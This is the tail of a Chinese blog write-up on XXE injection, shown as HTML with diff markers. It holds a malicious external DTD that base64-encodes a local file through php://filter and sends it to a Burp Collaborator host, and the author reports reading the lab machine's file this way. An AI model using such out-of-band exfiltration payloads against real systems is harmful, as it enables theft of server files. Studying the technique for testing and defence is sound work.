+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">payload</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=1.txt&quot;</span>&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">param1</span> <span class="string">&quot;&lt;!ENTITY  external SYSTEM &#x27;http://xcd123kik2apvsgubws336a9107qvf.burpcollaborator.net/?flag=%payload;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>只是不知道为什么github上只能命名为dtd，如果是xml的话访问链接会报404<br>最后成功读取到了靶机目录下的1.txt文件<br><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2018/06/02/xxe/3.png" alt="1" data-caption="1" loading="lazy"></p>
+
+    
+  </article>
+
+  
+      
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/%E6%80%BB%E7%BB%93/" rel="tag">总结</a>
+    
+</div>
+  
+  
+    <script async src="/js/copy-codeblock.js?v=1688978534246"></script>
+  
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div>
+</div>
+        <div class="nexmoe-post-right">
+              <div class="nexmoe-fixed">
+                  <div class="nexmoe-tool"> 
+                    
+                      
+                        
+                          
+                          
+                              <button class="mdui-fab catalog" style="overflow:unset;">
+                                  <i class="nexmoefont icon-i-catalog"></i>
+                                  <div class="nexmoe-toc">
+                                      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#xml"><span class="toc-number">1.</span> <span class="toc-text">xml</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#dtd-%E6%96%87%E6%A1%A3%E7%B1%BB%E5%9E%8B%E5%AE%9A%E4%B9%89"><span class="toc-number">2.</span> <span class="toc-text">dtd 文档类型定义</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E9%83%A8"><span class="toc-number">2.1.</span> <span class="toc-text">内部</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E9%83%A8"><span class="toc-number">2.2.</span> <span class="toc-text">外部</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E4%BD%93"><span class="toc-number">2.3.</span> <span class="toc-text">实体</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E9%83%A8%E5%AE%9E%E4%BD%93"><span class="toc-number">2.3.1.</span> <span class="toc-text">内部实体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93"><span class="toc-number">2.3.2.</span> <span class="toc-text">外部实体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93"><span class="toc-number">2.3.3.</span> <span class="toc-text">参数实体</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6-x2F-x2F-%E4%B8%8D%E5%90%8C%E7%A8%8B%E5%BA%8F%E6%94%AF%E6%8C%81%E5%8D%8F%E8%AE%AE%E4%B8%8D%E4%B8%80%E6%A0%B7-%E8%AF%BB%E5%8F%96%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%97%B6%E5%80%99%E5%8F%AF%E4%BB%A5%E8%80%83%E8%99%91php-x2F-x2F-filter"><span class="toc-number">3.1.</span> <span class="toc-text">读取文件&#x2F;&#x2F;不同程序支持协议不一样 读取失败的时候可以考虑php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dos%E6%94%BB%E5%87%BB"><span class="toc-number">3.2.</span> <span class="toc-text">dos攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">4.</span> <span class="toc-text">防御</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B5%9B%E6%80%BB%E2%99%82%E7%89%9B%E9%80%BC"><span class="toc-number">5.</span> <span class="toc-text">赛总♂牛逼</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#burp-collaborator-client"><span class="toc-number">5.1.</span> <span class="toc-text">burp collaborator client</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#github"><span class="toc-number">5.2.</span> <span class="toc-text">github</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%AD%E5%8D%9A%E5%AE%A2%EF%BC%8C%E4%B9%B0%E5%9F%9F%E5%90%8D"><span class="toc-number">5.3.</span> <span class="toc-text">搭博客，买域名</span></a></li></ol></li></ol>
+                                  </div>
+                              </button>
+                          
+                          
+                      
+                    
+                      <a href="#nexmoe-content" class="toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+                  </div>
+              </div>
+            </div>
+    </div>
+    <div id="nexmoe-search-space">
+	<div class="search-container">
+		<div class="search-header">
+			<div class="search-input-container">
+				<input
+					class="search-input"
+					type="text"
+					placeholder="Search"
+					oninput="sinput();"
+				/>
+			</div>
+			<a class="search-close" onclick="sclose();">×</a>
+		</div>
+		<div class="search-body"></div>
+	</div>
+</div>
+
+    
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
+
+</body>
+
+</html>
